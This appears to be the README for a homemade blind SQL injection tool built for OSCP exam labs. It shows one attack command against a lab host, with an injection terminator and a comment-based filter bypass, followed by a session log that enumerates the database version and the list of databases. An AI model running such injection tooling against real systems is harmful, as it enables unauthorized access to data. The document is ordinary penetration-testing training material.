#### Use case

    This module is for blind SQL injection.
    SQLmap is a better andmore robust alternative, however,
    we are not allowed to use automation tools on the OSCP.
    Therefore, I created this custom module for my own usage.

    #### Sample module wbsql
    wbsql -rh 10.11.1.251 -if burpRequest.txt -t "t')" -wd "/**/" -co "#" -hp 127.0.0.1:8080 -pps 11
        Options:

        1: Get database version
        2: Get current database name
        3: List all databases
        4: List tables from database
        5: List columns from a table
        5: Get column value for a row from a table
        Type 'exit' to exit


        Select an option (numerical value): 1
        Total time: 12.607749938964844 seconds
        Database version: 5.7.27-0ubuntu0.18.04.1
        Options:

        1: Get database version
        2: Get current database name
        3: List all databases
        4: List tables from database
        5: List columns from a table
        5: Get column value for a row from a table
        Type 'exit' to exit


        Select an option (numerical value): 2
        Total time: 8.911953926086426 seconds
        Current database name: wordpress
        Options:

        1: Get database version
        2: Get current database name
        3: List all databases
        4: List tables from database
        5: List columns from a table
        5: Get column value for a row from a table
        Type 'exit' to exit


        Select an option (numerical value): 3
        Total time: 28.784571886062622 seconds
        Databases:
        information_schema
        mysql
        performance_schema
        sys
        wordpress

        Options:

        1: Get database version
        2: Get current database name
        3: List all databases
        4: List tables from database
        5: List columns from a table
        5: Get column value for a row from a table
        Type 'exit' to exit


        Select an option (numerical value): exit
